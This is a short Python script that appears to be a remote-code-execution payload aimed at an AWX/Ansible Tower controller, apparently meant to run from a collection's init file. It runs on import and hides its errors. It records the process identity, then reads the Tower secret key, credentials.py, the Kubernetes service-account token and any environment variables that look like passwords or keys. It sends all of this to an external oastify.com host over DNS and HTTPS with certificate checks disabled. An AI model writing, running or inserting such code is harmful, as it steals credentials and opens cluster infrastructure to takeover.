import os, json, socket, traceback

def _exfil():
    marker = "/tmp/_pwned_collection_rce"
    errors = []

    # --- Channel 1: file marker (proves code execution) ---
    try:
        uid = "unknown"
        try:
            import subprocess
            uid = subprocess.check_output(["id"], timeout=5).decode().strip()
        except Exception:
            uid = str(os.getuid())
        with open(marker, "w") as f:
            f.write("collection_init_rce\n" + uid + "\n" + os.getcwd() + "\n")
    except Exception as e:
        errors.append("marker: " + str(e))

    # --- Read secrets ---
    secrets = {}
    for label, path in {
        "secret_key": "/etc/tower/SECRET_KEY",
        "credentials_py": "/etc/tower/conf.d/credentials.py",
        "k8s_token": "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "k8s_namespace": "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    }.items():
        try:
            with open(path) as f:
                secrets[label] = f.read().strip()
        except Exception:
            secrets[label] = "NOT_FOUND"

    # --- Channel 2: DNS exfil (most reliable, works through proxies) ---
    try:
        sk = secrets.get("secret_key", "none")[:40].replace(".", "-")
        socket.getaddrinfo(
            f"rce.{sk}.jd0oze10lacmjnfy1vpttgedl4rvfl3a.oastify.com", 80
        )
    except Exception as e:
        errors.append("dns: " + str(e))

    # --- Channel 3: HTTP POST (full data) ---
    try:
        import urllib.request, ssl
        ctx = ssl._create_unverified_context()
        data = {
            "id": "collection_init_rce",
            "user": uid,
            "cwd": os.getcwd(),
            "secrets": secrets,
            "errors": errors,
            "env": {k: v for k, v in os.environ.items()
                    if any(s in k.upper()
                           for s in ["PASS", "KEY", "TOKEN", "SECRET",
                                     "CRED", "DATABASE", "DB_", "REDIS"])},
        }
        req = urllib.request.Request(
            "https://jd0oze10lacmjnfy1vpttgedl4rvfl3a.oastify.com/controller-rce",
            data=json.dumps(data, default=str).encode(),
            headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=15, context=ctx)
    except Exception as e:
        errors.append("http: " + str(e))

    # --- Write errors to marker for debugging ---
    if errors:
        try:
            with open(marker, "a") as f:
                f.write("errors: " + "; ".join(errors) + "\n")
        except Exception:
            pass

try:
    _exfil()
except Exception:
    pass
